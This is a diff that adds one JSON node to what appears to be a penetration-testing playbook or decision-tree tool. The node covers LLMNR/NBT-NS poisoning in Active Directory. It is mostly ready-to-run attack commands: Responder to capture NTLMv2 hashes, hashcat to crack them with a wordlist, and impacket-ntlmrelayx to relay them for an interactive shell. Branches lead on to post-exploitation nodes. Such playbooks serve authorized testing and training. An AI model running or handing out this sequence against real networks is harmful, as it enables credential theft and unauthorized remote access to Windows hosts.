@@ -1,0 +1,22 @@
+{
+  "id": "responder",
+  "phase": "AD",
+  "title": "Responder / LLMNR Poisoning",
+  "body": "Poison LLMNR/NBT-NS broadcasts to capture NTLMv2 hashes. Run early — let it collect in background while you enumerate. Relay if cracking fails.",
+  "cmd": "sudo responder -I eth0 -wdF\n\n# Captured hashes appear in /usr/share/responder/logs/\ncat /usr/share/responder/logs/*.txt\n\n# Crack NTLMv2 (module 5600)\nhashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt\nhashcat -m 5600 ntlmv2.txt rockyou.txt -r best64.rule\n\n# If cracking fails — relay instead (turn off SMB/HTTP in Responder.conf first)\nsudo responder -I eth0 -wdF --lm\nimpacket-ntlmrelayx -tf targets.txt -smb2support\nimpacket-ntlmrelayx -tf targets.txt -smb2support -i  # interactive shell",
+  "warn": "Disable SMB and HTTP in /etc/responder/Responder.conf before running ntlmrelayx — both cannot listen on the same port.",
+  "choices": [
+    {
+      "label": "Captured and cracked hash",
+      "next": "creds_found"
+    },
+    {
+      "label": "Relayed hash — got shell",
+      "next": "windows_post_exploit"
+    },
+    {
+      "label": "No hashes captured — try other AD vectors",
+      "next": "ad_start"
+    }
+  ]
+}
